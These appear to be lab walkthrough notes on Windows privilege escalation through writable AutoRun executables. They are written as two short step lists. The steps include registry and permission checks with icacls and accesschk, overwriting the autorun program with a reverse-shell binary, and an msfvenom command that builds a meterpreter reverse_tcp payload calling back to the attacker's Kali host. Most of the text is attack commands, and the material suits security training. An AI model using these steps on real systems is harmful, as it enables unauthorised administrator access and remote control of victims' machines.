
**Example 1:**

1. **Query AutoRun Executables:**
   ```plaintext
   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   ```

2. **Check Executable Permissions Using icacls:**
   ```plaintext
   icacls "C:\Program Files\Autorun Program\

program.exe"
   ```
   - The output should show that "BUILTIN\Users" or "NT AUTHORITY\INTERACTIVE" has "F" (Full Control) or "M" (Modify) permissions for the file to be vulnerable.

3. **Check Executable Permissions Using AccessChk:**
   ```plaintext
   C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
   ```
   - Confirms that the executable is writable by everyone.

4. **Overwrite Executable:**
   ```plaintext
   copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
   ```

5. **Exploit:**
   - Start a listener on Kali.
   - Restart the Windows VM, which triggers the reverse shell.

**Example 2:**

1. **Generate Malicious Executable:**
   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
   ```

2. **Copy to Vulnerable Path:**
   - Place `program.exe` in `C:\Program Files\Autorun Program`.

3. **Simulate Admin Logon:**
   - Log off and log back on as an administrator.

4. **Exploit:**
   - Wait for a session to open in Metasploit.

---
